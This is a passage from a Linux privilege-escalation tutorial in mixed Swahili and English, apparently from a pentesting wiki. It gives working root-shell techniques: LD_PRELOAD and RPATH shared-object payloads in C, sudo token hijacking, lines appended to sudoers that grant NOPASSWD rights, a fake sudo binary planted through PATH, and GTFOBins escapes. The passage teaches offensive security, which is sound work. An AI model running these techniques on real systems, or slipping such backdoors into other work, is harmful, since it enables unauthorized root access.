Kumbuka kwamba ikiwa una write permissions over the docker socket kwa sababu uko **inside the group `docker`** una [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **njia zaidi za kutoroka kutoka docker au kuitumia vibaya kuinua ruhusa** katika:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Ikiwa ugundua kwamba unaweza kutumia **`ctr`** soma ukurasa ufuatao kwani **huenda ukaweza kuuitumia vibaya kuinua ruhusa**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Ikiwa ugundua kwamba unaweza kutumia **`runc`** soma ukurasa ufuatao kwani **huenda ukaweza kuuitumia vibaya kuinua ruhusa**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo tata wa **inter-Process Communication (IPC)** unaowawezesha programu kuingiliana na kushirikiana data kwa ufanisi. Ulioundwa kwa mfumo wa kisasa wa Linux, hutoa fremu imara kwa aina tofauti za mawasiliano ya programu.

Mfumo ni mwingi, ukisaidia IPC ya msingi inayoboreshwa kubadilishana data kati ya michakato, ikikumbusha **enhanced UNIX domain sockets**. Zaidi ya hayo, huwezesha kutangaza matukio au ishara, kukuza uunganishaji rahisi kati ya vipengele vya mfumo. Kwa mfano, ishara kutoka kwa daemon ya Bluetooth kuhusu simu inayoingia inaweza kusababisha player wa muziki kunyamaza, kuboresha uzoefu wa mtumiaji. Aidha, D-Bus inasaidia mfumo wa remote object, kurahisisha maombi ya huduma na mwito wa method kati ya programu, ikipunguza ugumu wa mchakato uliokuwa wa jadi.

D-Bus inafanya kazi kwa mfano wa **allow/deny**, ikisimamia ruhusa za ujumbe (miito ya method, upitishaji wa ishara, n.k.) kulingana na athari ya jumla ya sheria za sera zinazofanana. Sera hizi zinaelezea mwingiliano na bus, na huenda zikaruhusu kuinua ruhusa kwa kuchochea ruhusa hizi.

Mfano wa sera hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umeonyeshwa, ukielezea ruhusa kwa user root kumiliki, kutuma, na kupokea ujumbe kutoka `fi.w1.wpa_supplicant1`.

Sera zisizo na user au group maalum zinatumika kwa wote, ilhali sera za muktadha wa "default" zinahusu wote ambao hawajafunikwa na sera maalum nyingine.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya enumerate na exploit mawasiliano ya D-Bus hapa:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Huwa ni vya kuvutia enumerate network na kubaini nafasi ya mashine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Bandari wazi

Daima angalia huduma za mtandao zinazokimbia kwenye mashine ambazo hukuweza kuingiliana nazo kabla ya kuifikia:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Angalia ikiwa unaweza sniff traffic. Ikiwa unaweza, unaweza kupata credentials.
```
timeout 1 tcpdump
```
## Watumiaji

### Uorodheshaji wa Jumla

Angalia wewe ni **nani**, ni **uruhusa** gani unao, ni **watumiaji** gani wako kwenye mfumo, ni nani wanaoweza **kuingia**, na ni nani wana **uruhusa za root**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Kubwa

Baadhi ya toleo za Linux zilipata mdudu unaowawezesha watumiaji wenye **UID > INT_MAX** kuinua ruhusa. Taarifa zaidi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Vikundi

Angalia kama wewe ni **mwanachama wa kikundi chochote** ambacho kinaweza kukupa ruhusa za root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Angalia ikiwa kuna kitu chochote kinachovutia kimehifadhiwa ndani ya clipboard (ikiwa inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nywila
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nenosiri zinazojulikana

Ikiwa unajua **nenosiri lolote** la mazingira **jaribu kuingia kama kila user** ukitumia nenosiri hilo.

### Su Brute

Ikiwa hautajali kuhusu kusababisha kelele nyingi na `su` na `timeout` binaries zipo kwenye kompyuta, unaweza kujaribu brute-force user ukitumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kwa parameter ya `-a` pia hujaribu brute-force users.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Ikiwa ugundua kuwa unaweza **kuandika ndani ya baadhi ya folda za $PATH** unaweza kuwa na uwezo wa kupandisha privileges kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** kwa jina la command ambayo itatekelezwa na user mwingine (ideally root) na ambayo **haitasomwa kutoka kwenye folda iliyoko kabla** ya folda yako inayoweza kuandikwa katika $PATH.

### SUDO and SUID

Unaweza kuruhusiwa kutekeleza command fulani ukitumia sudo au zinaweza kuwa na suid bit. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa zinakuwezesha kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Mipangilio ya Sudo inaweza kumruhusu mtumiaji kutekeleza amri fulani kwa ruhusa za mtumiaji mwingine bila kujua nywila.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`, sasa ni rahisi kupata shell kwa kuongeza `ssh` key kwenye saraka ya `root` au kwa kuitisha `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Kiagizo hiki kinamruhusu mtumiaji **kuweka kigezo cha mazingira** wakati wa kutekeleza kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **based on HTB machine Admirer**, ulikuwa **vulnerable** kwa **PYTHONPATH hijacking** kupakia maktaba yoyote ya python wakati skiripti ikitekelezwa kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV imehifadhiwa kupitia sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Kwa nini inafanya kazi: Kwa shells zisizo-interactive, Bash hutathmini `$BASH_ENV` na kusoma faili hiyo kabla ya kuendesha script lengwa. Sheria nyingi za sudo zinaruhusu kuendesha script au shell wrapper. Ikiwa `BASH_ENV` imetunzwa na sudo, faili yako itasomwa kwa idhini ya root.

- Mahitaji:
- Sheria ya sudo unayoweza kuendesha (lengo lolote linaloitisha `/bin/bash` bila kuingiliana, au script yoyote ya bash).
- `BASH_ENV` kuwepo ndani ya `env_keep` (angalia kwa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Kuimarisha usalama:
- Ondoa `BASH_ENV` (na `ENV`) kutoka `env_keep`, tumia `env_reset`.
- Epuka shell wrappers kwa amri zinazoruhusiwa na sudo; tumia binaries ndogo.
- Zingatia kurekodi I/O ya sudo na utoaji wa tahadhari wakati env vars yaliyohifadhiwa yanapotumika.

### Njia za bypass za utekelezaji wa sudo

**Ruka** kusoma faili nyingine au tumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** inatumiwa (\*), ni rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Hatua za kuzuia**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

Ikiwa **sudo permission** imetolewa kwa amri moja **bila kubainisha njia**: _hacker10 ALL= (root) less_ unaweza ku-exploit kwa kubadilisha PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Mbinu hii pia inaweza kutumika ikiwa **suid** binary **inatekeleza amri nyingine bila kutaja njia yake (angalia kila mara kwa** _**strings**_ **yaliyomo ya SUID binary isiyo ya kawaida)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary yenye njia ya amri

Ikiwa **suid** binary **inatekeleza amri nyingine kwa kutaja njia**, basi, unaweza kujaribu **export a function** iitwayo kama amri ambayo faili ya suid inaiita.

Kwa mfano, ikiwa suid binary inaita _**/usr/sbin/service apache2 start**_ unapaswa kujaribu kuunda function na kui-export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapoitisha binary ya suid, kazi hii itatekelezwa

### LD_PRELOAD & **LD_LIBRARY_PATH**

Variable ya mazingira **LD_PRELOAD** hutumika kubainisha maktaba za pamoja (shared libraries) moja au zaidi (.so files) ambazo zinasomwa na loader kabla ya zingine zote, ikiwa ni pamoja na maktaba ya kawaida ya C (`libc.so`). Mchakato huu unajulikana kama preloading ya maktaba.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kutumika vibaya, hasa kwa executables za **suid/sgid**, mfumo unaweka masharti fulani:

- Loader hupuuza **LD_PRELOAD** kwa executables ambapo kitambulisho cha mtumiaji halisi (_ruid_) hakifani na kitambulisho cha mtumiaji chenye nguvu (_euid_).
- Kwa executables zenye suid/sgid, preloading inafanywa tu kwa maktaba zilizoko katika njia za kawaida ambazo pia zimesetwa suid/sgid.

Privilege escalation inaweza kutokea ikiwa una uwezo wa kutekeleza amri kwa kutumia `sudo` na matokeo ya `sudo -l` yanajumuisha taarifa **env_keep+=LD_PRELOAD**. Usanidi huu unaruhusu variable ya mazingira **LD_PRELOAD** kudumu na kutambuliwa hata wakati amri zinaendeshwa kwa `sudo`, na hivyo kuleta hatari ya utekelezaji wa arbitrary code kwa uwezo uliopandishwa.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **tengeneza** ukitumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **escalate privileges** kwa kuendesha
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc inayofanana inaweza kutiliwa matumizi ikiwa mshambuliaji anadhibiti env variable **LD_LIBRARY_PATH**, kwa sababu anadhibiti njia ambapo libraries zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Unapokutana na binary yenye ruhusa za **SUID** ambayo inaonekana isiyo ya kawaida, ni desturi nzuri kuthibitisha kama inapakia faili za **.so** ipasavyo. Hii inaweza kukaguliwa kwa kukimbiza amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na hitilafu kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunaonyesha uwezekano wa exploitation.

Ili exploit hii, mtu angeendelea kwa kuunda faili ya C, sema _"/path/to/.config/libcalc.c"_, iliyo na code ifuatayo:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Msimbo huu, mara ukichapishwa (compiled) na kutekelezwa, unalenga kuinua privileges kwa kubadili ruhusa za faili na kuendesha shell yenye privileges zilizoongezeka.

Compile C file hapo juu kuwa shared object (.so) file kwa kutumia:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Mwishowe, kuendesha binary iliyoathiriwa ya SUID kunapaswa kuchochea exploit, na kuruhusu uwezekano wa uvamizi wa mfumo.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa baada ya kupata SUID binary inayopakia library kutoka kwenye folda ambayo tunaweza kuandika, tuunde library hiyo katika folda hiyo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ikiwa unapata kosa kama
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
hiyo inamaanisha kuwa maktaba uliyotengeneza inahitaji kuwa na function iitwayo `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya binaries za Unix ambazo mvaaji anaweza kuzitumia kubypass vizuizi vya usalama vya ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa kesi ambapo unaweza **only inject arguments** kwenye amri.

Mradi unakusanya function halali za binaries za Unix ambazo zinaweza kutumiwa vibaya kuondoka katika restricted shells, escalate au maintain elevated privileges, transfer files, spawn bind na reverse shells, na kurahisisha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

Katika kesi ambapo una **sudo access** lakini si nywila, unaweza escalate privileges kwa **kusubiri utekelezaji wa amri ya sudo kisha hijack session token**.

Mahitaji ili kupandisha privileges:

- Tayari una shell kama mtumiaji "_sampleuser_"
- "_sampleuser_" ame**used `sudo`** kuendesha kitu katika **last 15mins** (kwa default ndio muda wa sudo token unaoturuhusu kutumia `sudo` bila kuingiza nywila)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuipakia)

(Unaweza kwa muda kuwezesha `ptrace_scope` kwa kutumia `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kudumu kwa kubadilisha `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **exploit ya pili** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ **inamilikiwa na root na ina setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **exploit ya tatu** (`exploit_v3.sh`) itatengeneza **faili ya sudoers** ambayo inafanya **sudo tokens kuwa za milele na kuruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Kama una **ruhusa za kuandika** kwenye kabrasha au kwenye yoyote ya faili zilizoundwa ndani ya kabrasha, unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) **kuunda sudo token kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kuandika juu ya faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo mwenye PID 1234, unaweza **kupata ruhusa za sudo** bila kuhitaji kujua nywila kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizopo ndani ya `/etc/sudoers.d` zinaelekeza nani anaweza kutumia `sudo` na kwa jinsi gani. Faili hizi **kwa chaguo-msingi zinaweza kusomwa tu na user root na group root**.\
**Ikiwa** unaweza **kusoma** faili hii unaweza kuwa na uwezo wa **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utaweza **kupandisha ruhusa**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ikiwa unaweza kuandika unaweza kutumia vibaya ruhusa hii
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kuutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna mbadala kadhaa kwa binary ya `sudo` kama `doas` kwa OpenBSD, kumbuka kuangalia usanidi wake kwenye `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ikiwa unajua kwamba **mtumiaji kawaida huungana kwenye mashine na hutumia `sudo`** kuinua ruhusa na umepata shell ndani ya muktadha wa mtumiaji huyo, unaweza **kuunda executable mpya ya sudo** ambayo itaendesha kodi yako kama root kisha amri ya mtumiaji. Kisha, **badilisha $PATH** ya muktadha wa mtumiaji (kwa mfano ukaongeza path mpya katika .bash_profile) ili wakati mtumiaji anapotekeleza sudo, executable yako ya sudo itatekelezwa.

Chukua tahadhari kwamba ikiwa mtumiaji anatumia shell tofauti (si bash) utahitaji kubadilisha faili nyingine ili kuongeza path mpya. Kwa mfano [sudo-piggyback](https://github.com/APTy/sudo-piggyback) hubadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Maktaba Iliyoshirikiwa

### ld.so

Faili `/etc/ld.so.conf` inaonyesha **wapi faili za usanidi zilizopakiwa zinatoka**. Kwa kawaida, faili hii ina njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hii ina maana kwamba faili za usanidi kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi zinaonyesha **folda nyingine** ambapo **maktaba** zitatafutwa. Kwa mfano, yaliyomo katika `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kwamba mfumo utatafuta maktaba ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu fulani **mtumiaji ana ruhusa ya kuandika** kwenye mojawapo ya njia zilizoonyesha: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote ndani ya faili za usanidi ndani ya `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Tazama **how to exploit this misconfiguration** kwenye ukurasa ufuatao:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib ndani ya `/var/tmp/flag15/` itatumiwa na programu mahali hapa kama ilivyoainishwa katika kigezo cha `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha tengeneza maktaba mbaya katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uwezo

Linux capabilities hutoa **sehemu ndogo ya ruhusa za root zinazopatikana kwa mchakato**. Hii inavunja kwa ufanisi ruhusa za root kuwa **vitengo vidogo na vya kipekee**. Kila kati ya vitengo hivi kinaweza kutolewa kwa mchakato kwa kujitegemea. Kwa njia hii seti kamili ya ruhusa inapunguzwa, ikipunguza hatari za exploitation.\
Soma ukurasa ufuatao ili **ujifunze zaidi kuhusu capabilities na jinsi ya kuvitumia vibaya**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Ruhusa za saraka

Katika directory, the **bit for "execute"** inaashiria kwamba mtumiaji aliyepatikana anaweza "**cd**" kwenda ndani ya folda.\
Bit ya **"read"** inaashiria mtumiaji anaweza **kuorodhesha** **faili**, na bit ya **"write"** inaashiria mtumiaji anaweza **kufuta** na **kuunda** **faili** mpya.

## ACLs

Access Control Lists (ACLs) zinawakilisha safu ya pili ya ruhusa za hiari, zenye uwezo wa **kuzidi ruhusa za jadi za ugo/rwx**. Ruhusa hizi zinaboresha udhibiti wa upatikanaji wa faili au directory kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao sio wamiliki au sehemu ya kundi. Ngazi hii ya **undani** inahakikisha usimamizi sahihi zaidi wa upatikanaji. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Mpa** mtumiaji "kali" ruhusa za "read" na "write" juu ya faili:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zilizo na ACLs maalum kutoka kwenye mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Fungua shell sessions

Katika **matoleo ya zamani** unaweza **hijack** baadhi ya **shell** session za mtumiaji mwingine (**root**).\
Katika **matoleo mapya** utaweza **connect** tu kwenye screen sessions za **mtumiaji wako mwenyewe**. Hata hivyo, unaweza kupata **taarifa za kuvutia ndani ya session**.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Unganisha kwenye session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Hili lilikuwa tatizo kwa **old tmux versions**. Sikuweza hijack session ya tmux (v2.1) iliyoundwa na root kama mtumiaji asiye na ruhusa.

**Orodhesha tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Unganisha kwenye session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
Hitilafu hii inatokea wakati wa kuunda ssh key mpya katika OS hizo, kwani **mabadiliko 32,768 tu yalikuwa yanayowezekana**. Hii ina maana kwamba uwezekano wote yanaweza kukokotolewa na **ikiwa una ssh public key unaweza kutafuta private key inayolingana**. Unaweza kupata uwezekano uliohesabiwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Inaeleza ikiwa uthibitishaji wa nenosiri unaruhusiwa. Chaguo-msingi ni `no`.
- **PubkeyAuthentication:** Inaeleza ikiwa authentication kwa kutumia public key inaruhusiwa. Chaguo-msingi ni `yes`.
- **PermitEmptyPasswords**: Wakati authentication ya password inaruhusiwa, inaeleza ikiwa server inaruhusu kuingia kwenye akaunti zenye nywila tupu. Chaguo-msingi ni `no`.

### PermitRootLogin

Inaeleza kama root anaweza kuingia kwa kutumia ssh, chaguo-msingi ni `no`. Thamani zinazowezekana:

- `yes`: root anaweza kuingia kwa kutumia password na private key
- `without-password` or `prohibit-password`: root anaweza kuingia kwa private key tu
- `forced-commands-only`: Root anaweza kuingia tu kwa kutumia private key na ikiwa options za commands zimetajwa
- `no` : hapana

### AuthorizedKeysFile

Inaeleza faili zenye public keys ambazo zinaweza kutumika kwa authentication ya mtumiaji. Inaweza kuwa na tokens kama `%h`, ambazo zitabadilishwa na directory ya nyumbani. **Unaweza kubainisha absolute paths** (kuanza kwa `/`) au **relative paths kutoka kwa home ya mtumiaji**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Usanidi huo utaonyesha kwamba ikiwa utajaribu kuingia kwa kutumia **private** key ya mtumiaji "**testusername**", ssh italinganisha **public key** ya key yako na zile zilizoko katika `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding inakuwezesha **use your local SSH keys instead of leaving keys** (without passphrases!) sitting on your server. Kwa hivyo, utaweza **jump** via ssh **to a host** na kutoka hapo **jump to another** host **using** the **key** located in your **initial host**.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama ifuatavyo:
```
Host example.com
ForwardAgent yes
```
Kumbuka kwamba ikiwa `Host` ni `*`, kila wakati mtumiaji anapohama kwenda mashine tofauti, mwenyeji huyo ataweza kupata funguo (ambayo ni tatizo la usalama).

Faili `/etc/ssh_config` inaweza **kudhibiti upya** chaguzi hizi na kuruhusu au kukataa usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** ssh-agent forwarding kwa neno kuu `AllowAgentForwarding` (chaguo-msingi ni kuruhusu).

